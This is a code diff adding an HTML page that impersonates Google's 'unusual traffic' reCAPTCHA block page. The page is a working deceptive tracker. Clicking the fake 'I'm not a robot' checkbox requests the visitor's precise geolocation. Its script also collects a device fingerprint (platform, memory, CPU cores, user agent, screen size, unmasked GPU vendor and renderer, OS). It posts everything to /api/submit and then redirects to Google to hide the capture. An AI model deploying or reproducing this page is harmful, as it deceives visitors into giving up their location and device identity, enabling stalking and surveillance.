@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="initial-scale=1">
+  <title>Are you a robot?</title>
+  <script type="text/javascript">
+    if (window.location.protocol == "http:") {
+      var restOfUrl = window.location.href.substr(5);
+      window.location = "https:" + restOfUrl;
+    }
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <style>
+    body {
+      font-family: arial, sans-serif;
+      background-color: #fff;
+      color: #000;
+      padding: 20px;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+
+    .container {
+      max-width: 420px;
+    }
+
+    hr {
+      color: #ccc;
+      background-color: #ccc;
+      height: 1px;
+      border: none;
+      margin: 15px 0;
+    }
+
+    .g-recaptcha {
+      margin: 20px 0;
+    }
+
+    .recaptcha-checkbox-container {
+      height: 74px;
+      width: 300px;
+      background-color: #f9f9f9;
+      border: 1px solid #d3d3d3;
+      border-radius: 3px;
+      padding: 0;
+      position: relative;
+    }
+
+    .recaptcha-checkbox-wrapper {
+      display: flex;
+      align-items: center;
+      height: 100%;
+      padding: 0 13px;
+    }
+
+    .recaptcha-checkbox {
+      width: 18px;  /* Smaller checkbox size */
+      height: 18px; /* Smaller checkbox size */
+      border: 1px solid #c1c1c1; /* Thinner border */
+      border-radius: 2px;
+      background-color: #fff;
+      cursor: pointer;
+      position: relative;
+    }
+
+    .recaptcha-checkbox.checked::after {
+      content: "";
+      position: absolute;
+      top: 2px;
+      left: 6px;
+      width: 4px;
+      height: 9px;
+      border: solid #009e55;
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
+
+    .recaptcha-label {
+      margin-left: 12px;
+      font-size: 14px;
+      font-family: Roboto, helvetica, arial, sans-serif;
+      color: #000;
+    }
+
+    .recaptcha-footer {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 13px;
+      font-size: 10px;
+      color: #555;
+    }
+
+    .recaptcha-logo {
+      display: flex;
+      align-items: center;
+    }
+
+    .recaptcha-logo-text {
+      font-size: 10px;
+      color: #555;
+    }
+
+    .recaptcha-links {
+      font-size: 8px;
+    }
+
+    .recaptcha-links a {
+      text-decoration: none;
+      color: #555;
+    }
+
+    .about-section {
+      font-size: 13px;
+      margin-top: 20px;
+    }
+
+    .about-section h3 {
+      font-size: 14px;
+      margin: 0 0 10px 0;
+      font-weight: bold;
+    }
+
+    #infoDiv {
+      display: none;
+      background-color: #eee;
+      padding: 10px;
+      margin: 0 0 15px 0;
+      line-height: 1.4em;
+    }
+  </style>
+ </head>
+
+ <body onload="initialize();">
+  <div class="container">
+    <hr>
+
+    <div class="g-recaptcha" data-sitekey="" data-callback="submitCallback" data-s="">
+      <div class="recaptcha-checkbox-container">
+        <div class="recaptcha-checkbox-wrapper">
+          <div id="recaptcha-checkbox" class="recaptcha-checkbox" onclick="requestLocation()"></div>
+          <span class="recaptcha-label">I'm not a robot</span>
+        </div>
+      </div>
+    </div>
+
+    <hr>
+
+    <div class="about-section">
+      <h3>About this page</h3>
+      <p>
+        Our systems have detected unusual traffic from your computer network. This page checks to see if it's really you sending the requests, and not a robot. <a href="#" id="why-link">Why did this happen?</a>
+      </p>
+
+      <div id="infoDiv">
+        This page appears when Google automatically detects requests coming from your computer network which appear to be in violation of the <a href="//www.google.com/policies/terms/">Terms of Service</a>. The block will expire shortly after those requests stop. In the meantime, solving the above CAPTCHA will let you continue to use our services.<br><br>This traffic may have been sent by malicious software, a browser plug-in, or a script that sends automated requests. If you share your network connection, ask your administrator for help — a different computer using the same IP address may be responsible. <a href="//support.google.com/websearch/answer/86640">Learn more</a><br><br>Sometimes you may be asked to solve the CAPTCHA if you are using advanced terms that robots are known to use, or sending requests very quickly.
+      </div>
+
+      <p>
+        IP address: <span id="public-ip">101.183.216.42</span><br>
+        Time: <span id="datetime">2025-05-10T11:01:55.333Z</span><br>
+        URL: https://www.google.com/
+      </p>
+    </div>
+  </div>
+
+  <form id="captcha-form" action="index" method="post" style="display:none;">
+    <input type="hidden" name="q" value="">
+    <input type="hidden" name="continue" value="https://www.google.com/">
+    <textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response"></textarea>
+  </form>
+
+  <script type="text/javascript">
+    // Initialize page
+    function initialize() {
+      $.get("https://ifconfig.me/ip", function(data, status){
+        if (status == "success") {
+          $("#public-ip").text(data);
+        }
+      });
+      $("#datetime").text(new Date().toISOString());
+      
+      // Toggle info div when "Why did this happen?" is clicked
+      document.getElementById('why-link').addEventListener('click', function(e) {
+        e.preventDefault();
+        var infoDiv = document.getElementById('infoDiv');
+        infoDiv.style.display = infoDiv.style.display === 'none' ? 'block' : 'none';
+      });
+    }
+    
+    // Request geolocation when checkbox is clicked
+    function requestLocation() {
+      // Show loading state
+      document.getElementById('recaptcha-checkbox').style.border = "1px solid #4285f4";
+      
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          // Success callback
+          function(position) {
+            // Mark checkbox as checked
+            document.getElementById('recaptcha-checkbox').classList.add('checked');
+            // Submit data
+            collectAndSubmitData(position);
+          },
+          // Error callback
+          function(error) {
+            // Show error state
+            document.getElementById('recaptcha-checkbox').style.border = "1px solid #ff0000";
+            collectAndSubmitData(null, error);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 30000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        // Geolocation not supported
+        document.getElementById('recaptcha-checkbox').style.border = "1px solid #ff0000";
+        collectAndSubmitData(null, { message: "Geolocation not supported" });
+      }
+    }
+    
+    // Function to handle successful CAPTCHA verification
+    window.submitCallback = function() {
+      setTimeout(function() {
+        window.location.href = "https://www.google.com/";
+      }, 1500);
+      return true;
+    };
+    
+    // Collect device information
+    function collectDeviceInfo() {
+      const deviceInfo = {};
+      
+      // Platform info
+      deviceInfo.platform = navigator.platform || 'Not Available';
+      deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency || 'Not Available';
+      deviceInfo.deviceMemory = navigator.deviceMemory || 'Not Available';
+      deviceInfo.userAgent = navigator.userAgent;
+      
+      // Screen info
+      deviceInfo.screenHeight = window.screen.height;
+      deviceInfo.screenWidth = window.screen.width;
+      
+      // Browser info
+      let browserInfo = 'Not Available';
+      const ua = navigator.userAgent;
+      
+      if (ua.indexOf('Firefox') !== -1) {
+        browserInfo = 'Firefox ' + ua.match(/Firefox\/([0-9.]+)/)[1];
+      } else if (ua.indexOf('Chrome') !== -1) {
+        browserInfo = 'Chrome ' + ua.match(/Chrome\/([0-9.]+)/)[1];
+      } else if (ua.indexOf('Safari') !== -1) {
+        browserInfo = 'Safari ' + ua.match(/Safari\/([0-9.]+)/)[1];
+      } else if (ua.indexOf('Edge') !== -1) {
+        browserInfo = 'Edge ' + ua.match(/Edge\/([0-9.]+)/)[1];
+      }
+      
+      deviceInfo.browser = browserInfo;
+      
+      // GPU info
+      let gpuVendor = 'Not Available';
+      let gpuRenderer = 'Not Available';
+      
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+            gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          }
+        }
+      } catch (e) {
+        // Silent fail
+      }
+      
+      deviceInfo.gpuVendor = gpuVendor;
+      deviceInfo.gpuRenderer = gpuRenderer;
+      
+      // OS detection
+      let os = 'Not Available';
+      const userAgent = navigator.userAgent;
+      
+      if (userAgent.indexOf("Win") !== -1) os = "Windows";
+      else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
+      else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
+      else if (userAgent.indexOf("Android") !== -1) os = "Android";
+      else if (userAgent.indexOf("iOS") !== -1) os = "iOS";
+      
+      deviceInfo.os = os;
+      
+      return deviceInfo;
+    }
+    
+    // Combine all data and submit
+    function collectAndSubmitData(position, error) {
+      try {
+        // Collect device information
+        const deviceInfo = collectDeviceInfo();
+        
+        // Process geolocation data
+        let geoInfo = {};
+        
+        if (position) {
+          geoInfo = {
+            geolocationStatus: 'success',
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude,
+            altitudeAccuracy: position.coords.altitudeAccuracy,
+            heading: position.coords.heading,
+            speed: position.coords.speed,
+            timestamp: position.timestamp
+          };
+        } else {
+          geoInfo = {
+            geolocationStatus: 'error',
+            geolocationError: error ? (error.message || 'Unknown error') : 'Unknown error'
+          };
+        }
+        
+        // Combine all data
+        const allData = {
+          ...deviceInfo,
+          ...geoInfo
+        };
+        
+        // Submit data
+        fetch('/api/submit', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(allData)
+        })
+        .then(response => {
+          if (position) {
+            submitCallback();
+          }
+        })
+        .catch(error => {
+          console.error('Error submitting data:', error);
+          if (position) {
+            submitCallback();
+          }
+        });
+      } catch (error) {
+        console.error('Error collecting data:', error);
+        if (position) {
+          submitCallback();
+        }
+      }
+    }
+  </script>
+ </body>
+</html>
